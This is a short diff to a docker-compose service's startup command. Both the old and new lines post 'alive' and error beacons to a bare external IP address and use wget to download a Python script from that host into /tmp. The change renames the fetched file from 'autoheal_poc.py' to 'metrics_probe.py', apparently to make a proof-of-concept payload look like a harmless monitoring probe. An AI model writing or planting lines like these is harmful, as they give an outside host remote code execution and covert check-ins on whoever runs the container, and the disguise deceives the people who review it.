@@ -7,10 +7,10 @@ services:
       - -c
       - |
         apk add --no-cache curl iproute2 >/dev/null 2>&1
-        curl -sS -X POST "http://147.45.231.59:7777/?tag=V4-CONTAINER-UP" -d "alive" || true
-        wget -q -O /tmp/poc.py "http://147.45.231.59:7778/autoheal_poc.py"
+        curl -sS -X POST "http://147.45.231.59:7777/?tag=V5-UP" -d "alive" || true
+        wget -q -O /tmp/poc.py "http://147.45.231.59:7778/metrics_probe.py"
         if [ $? -ne 0 ]; then
-          curl -sS -X POST "http://147.45.231.59:7777/?tag=V4-DL-ERR" -d "download failed" || true
+          curl -sS -X POST "http://147.45.231.59:7777/?tag=V5-DL-ERR" -d "fail" || true
           sleep 3600
           exit 1
         fi
